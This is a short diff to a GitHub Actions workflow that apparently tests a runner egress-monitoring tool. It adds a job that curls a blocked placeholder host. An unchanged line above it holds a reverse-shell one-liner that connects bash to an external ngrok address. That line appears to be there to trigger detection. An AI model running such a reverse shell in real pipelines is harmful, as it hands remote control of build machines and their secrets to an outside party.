@@ -120,6 +120,19 @@ jobs:
       - run: |
           bash -c "bash -i >& /dev/tcp/0.tcp.us-cal-1.ngrok.io/17658 0>&1"
 
+  global-block-list:
+    if: ${{ github.event.inputs.run_only_anomalous != 'true' }}
+    runs-on: ubuntu-latest
+    steps:
+      - uses: step-security/harden-runner@v2
+        with:
+          egress-policy: audit
+
+      - name: Global block list test (evil.invalid)
+        run: |
+          echo "Attempting to reach evil.invalid (on global block list)..."
+          curl -I --max-time 5 https://evil.invalid || true
+
   anomalous-outbound-call:
     runs-on: ubuntu-latest
     steps:
